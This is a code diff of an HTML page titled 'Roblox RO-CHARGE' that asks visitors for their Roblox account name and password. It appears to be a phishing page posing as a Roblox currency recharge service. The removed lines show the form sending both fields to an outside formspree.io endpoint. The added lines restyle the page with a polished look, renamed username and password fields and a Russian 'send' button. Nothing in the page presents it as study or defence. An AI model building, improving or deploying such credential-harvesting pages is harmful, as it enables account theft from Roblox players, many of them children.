@@ -3,21 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <title>Roblox RO-CHARGE</title>
+    <style>
+        body {
+            background-image: url('https://github.com/rocharge/Roblox-RO-CHARGE/blob/main/peakpx.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        form {
+            background: rgba(255, 255, 255, 0.1); /* Полупрозрачный белый фон */
+            padding: 20px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        textarea,
+        input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            background-color: #0066cc;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005bb5;
+        }
+    </style>
 </head>
 <body>
-    <h1>Roblox RO-CHARGE</h1>
-    
-    <form action="https://formspree.io/f/mblrrlkz" method="POST">
+    <form>
         <label>
             Enter your Roblox account name:
-            <textarea name="message" required></textarea>
+            <textarea name="username" required></textarea>
         </label>
-        <br>
         <label>
-            Enter your roblox account password:
-            <textarea name="message" required></textarea>
+            Enter your Roblox account password:
+            <textarea name="password" required></textarea>
         </label>
-        <br>
         <button type="submit">Отправить</button>
     </form>
 </body>
